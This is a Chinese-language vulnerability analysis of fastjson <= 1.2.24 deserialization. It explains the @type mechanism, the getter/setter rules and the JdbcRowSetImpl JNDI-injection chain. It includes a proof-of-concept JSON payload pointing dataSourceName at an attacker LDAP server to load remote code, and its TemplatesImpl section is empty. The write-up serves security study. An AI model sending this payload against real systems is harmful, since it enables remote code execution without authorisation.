## 前言
影响版本：`fastjson <= 1.2.24`  
描述：fastjson 默认使用 `@type` 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter/setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。此漏洞开启了 fastjson 反序列化漏洞的大门，为安全研究人员提供了新的思路。

fastjson <= 1.2.24 存在两条利用链：

(1) jdbcRowSetImpl - JNDI注入

(2) TemplatesImpl

## fastjson的一些功能要点：
这里列举一些 fastjson 功能要点：

*   使用 `JSON.parse(jsonString)` 和 `JSON.parseObject(jsonString, Target.class)`，两者调用链一致，前者会在 jsonString 中解析字符串获取 `@type` 指定的类，后者则会直接使用参数中的 class。
*   fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，
    *   其中 getter 方法需满足条件：
        *   方法名长于 4
        *   不是静态方法
        *   以 `get` 开头且第 4 位是大写字母
        *   方法不能有参数传入
        *   继承自 `Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong`
        *   此属性没有 setter 方法；

    *   setter 方法需满足条件：
        *   方法名长于 4
        *   以 `set` 开头且第 4 位是大写字母
        *   非静态方法
        *   返回类型为 void 或当前类
        *   参数个数为 1 个。
            具体逻辑在 `com.alibaba.fastjson.util.JavaBeanInfo.build()` 中。

## jdbcRowSetImpl链：
万恶之源：com.sun.rowset.JdbcRowSetImpl#setAutoCommit

跟进 this.connect()方法：

<img width="556" alt="image" src="https://github.com/user-attachments/assets/fcdc10ab-c50e-47a4-8ddc-19ef983eba90" />

this.connect()方法中使用了 lookup()方法:

<img width="1069" alt="image" src="https://github.com/user-attachments/assets/c102876d-1049-4173-954f-700eba77ccbf" />

dataSourceName值可控，存在JNDI注入：

<img width="634" alt="image" src="https://github.com/user-attachments/assets/068f94ac-ab4a-47b9-b31c-0d459e936ea9" />

构造POC:

```
{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://192.168.43.95:8085/Command",
 "autoCommit":true
}
```

<img width="1055" alt="image" src="https://github.com/user-attachments/assets/8ed3d8b4-eb2e-49c3-94a7-4e46d62ab5f6" />

## TemplatesImpl链：















